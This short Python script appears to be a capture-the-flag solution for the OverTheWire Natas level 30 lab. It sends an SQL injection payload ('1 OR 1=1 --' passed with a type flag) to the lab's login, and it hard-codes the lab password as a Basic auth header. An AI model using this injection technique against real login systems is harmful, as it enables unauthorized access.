#!/bin/python3

import requests
from requests.auth import HTTPDigestAuth

url = 'http://natas30.natas.labs.overthewire.org'
natas_username = 'natas30'
natas_pwd = 'wie9iexae0Daihohv8vuu3cei9wahf0e'

# Since SQL_INTEGER is 4
params = {'username': 'natas31', 'password': ["1 OR 1=1 --", 4]}
headers = {'Authorization': 'Basic bmF0YXMzMDp3aWU5aWV4YWUwRGFpaG9odjh2dXUzY2VpOXdhaGYwZQ=='}
print(requests.post(url, data=params, headers=headers, verify=False).text)
